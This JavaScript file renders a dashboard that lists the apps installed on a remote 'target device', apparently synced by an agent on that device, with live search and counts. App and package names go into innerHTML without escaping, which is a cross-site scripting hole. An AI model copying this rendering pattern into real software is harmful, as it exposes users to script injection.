document.addEventListener('DOMContentLoaded', async () => {
    const container = document.getElementById('apps-container');
    const searchInput = document.getElementById('search-input');
    const statsBar = document.getElementById('stats-bar');
    const deviceId = localStorage.getItem('active_device_id');
    let allApps = [];

    if (!deviceId) {
        container.innerHTML = '<p style="color: #e74c3c; text-align: center;">Critical Error: Target Device ID missing.</p>';
        return;
    }

    try {
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // Fetch Apps (Ordered alphabetically)
        const appsRes = await fetch(`${config.supabase_url}/rest/v1/installed_apps?device_id=eq.${deviceId}&order=app_name.asc`, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await appsRes.json();

        if (!data || data.length === 0) {
            container.innerHTML = '<p style="color: #aaa; text-align: center;">No apps synced yet. The device will upload the registry on the next cycle.</p>';
            return;
        }

        allApps = data;
        updateStats(allApps);
        renderApps(allApps);

    } catch (error) {
        console.error("Apps Fetch Failure:", error);
        container.innerHTML = '<p style="color: #e74c3c; text-align: center;">Database connection failed.</p>';
    }

    // Live Search Logic
    searchInput.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase();
        const filtered = allApps.filter(a => 
            (a.app_name && a.app_name.toLowerCase().includes(query)) || 
            (a.package_name && a.package_name.toLowerCase().includes(query))
        );
        renderApps(filtered);
    });

    function updateStats(appData) {
        statsBar.style.display = 'flex';
        const total = appData.length;
        const systemCount = appData.filter(a => a.is_system_app).length;
        const userCount = total - systemCount;

        document.getElementById('stat-total').innerText = `Total: ${total}`;
        document.getElementById('stat-user').innerText = `User Installed: ${userCount}`;
        document.getElementById('stat-system').innerText = `System Apps: ${systemCount}`;
    }

    function renderApps(appList) {
        container.innerHTML = '';
        if (appList.length === 0) {
            container.innerHTML = '<p style="color: #888; text-align: center;">No apps match your search.</p>';
            return;
        }

        appList.forEach(app => {
            const isSystem = app.is_system_app;
            const badgeClass = isSystem ? 'system-app' : 'user-app';
            const badgeText = isSystem ? 'SYSTEM' : 'USER';
            const borderColor = isSystem ? '#e74c3c' : '#2ecc71';

            const card = document.createElement('div');
            card.className = 'app-card';
            card.style.borderLeftColor = borderColor;
            
            card.innerHTML = `
                <div class="app-info">
                    <span class="app-name">${app.app_name}</span>
                    <span class="app-pkg">${app.package_name}</span>
                </div>
                <div>
                    <span class="badge ${badgeClass}">${badgeText}</span>
                </div>
            `;
            container.appendChild(card);
        });
    }
});
